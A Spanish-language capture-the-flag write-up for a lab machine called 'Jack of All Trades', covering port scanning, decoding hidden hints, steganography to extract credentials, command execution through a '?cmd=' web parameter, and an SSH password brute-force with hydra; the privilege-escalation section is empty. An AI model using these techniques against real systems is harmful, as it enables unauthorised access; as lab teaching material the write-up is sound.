# Jack of All Trades
## Initial Scan
```
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)

```
## Enum
### HTTP
El hecho de que el HTTP este en el puerto 22 complica algunas cosas, pero nada que no podamos solucionar con cURL
En la pagina principal
```
<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```
Si decodificamos el string con base64 vemos lo siguiente
```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```
Obtengamos el archivo llamdo stego y busquemos esteganografia en el, vemos los strings caracteristicos de steghide, si probanos la contraseña obtenida antes sacaremos un archivo llamado creds.txt, en el pone lo siguiente
```
Hehe. Gotcha!

You're on the right path, but wrong image!
```
Descargamos la otra imagen, en esa no se ha usado steghide, veamos en /recovery.php

#### Recovery.php
En el fuente tenemos lo siguiente
```
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```
Si le aplicamos b32, hex to ascii y rot13 obtenemos el siguiente string
```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```
El link nos lleva a 
```
https://en.wikipedia.org/wiki/Stegosauria
```
Parece que me habia adelantado, volvemos a dondde estabamos antes

#### assets
En /assets/ hay 3 imagenes 2 de ellas ya las habiamos analizado , vayamos a por la tercera, en esta al usar steghide con la misma contraseña de antes y obtenemos un archivo llamdo cms.creds 

```
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: <Redacted>
```
Parece que no son para el ssh si no para el login en la web, sera mas comodo finalmente hacerlo desde un navegador, para ello en mi caso uso chromiun ya que mi version de firefox no permite modificar los allowed ports
```
chromium-browser --explicitly-allowed-ports=22
```
Entramos y nos logeamos en recovery.php tras esto se nos redirige a la siguiente pagina
```
http://10.10.119.190:22/nnxhweOV/index.php
```
Es cuestion de añadir un 
```
?cmd=
```
y ya tenemos un RCE , parece que no puedo obtener una rev shell con los metodos normales,pero listando los directorios en /home encontramos un archivo llamado jack_pass.lst, tiramos de hydra 
```
hydra -l jack -P jack_pass.lst ssh://10.10.68.189:80/
[80][ssh] host: 10.10.68.189   login: jack   password: IT*************@
```

Con el siguiente mensaje
```
GET me a 'cmd' and I'll run it for you Future-Jack.
```
## Privesc
